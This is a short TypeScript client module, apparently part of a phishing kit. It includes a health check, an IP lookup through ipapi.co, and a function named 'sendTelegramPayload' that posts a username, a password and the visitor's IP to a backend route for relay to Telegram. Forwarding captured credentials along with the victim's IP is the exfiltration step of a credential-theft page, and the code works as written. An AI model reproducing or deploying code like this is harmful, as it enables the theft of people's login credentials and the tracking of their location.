export async function requestBackendReady(): Promise<void> {
  const response = await fetch("/api/health", { cache: "no-store" });
  if (!response.ok) {
    throw new Error("Backend no disponible");
  }
}

export async function sendTelegramPayload(payload: {
  username: string;
  password: string;
  ip: string;
}): Promise<void> {
  const response = await fetch("/api/send-telegram", {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const body = await response.json().catch(() => null);
    const message = body?.error ?? "No se pudo enviar la informacion";
    throw new Error(message);
  }
}

export async function resolveIp(): Promise<string> {
  try {
    const response = await fetch("https://ipapi.co/json/", { cache: "no-store" });
    if (!response.ok) {
      throw new Error("ipapi no disponible");
    }
    const data = await response.json();
    return data?.ip ?? "Sin IP";
  } catch (error) {
    console.error(error);
    return "Sin IP";
  }
}
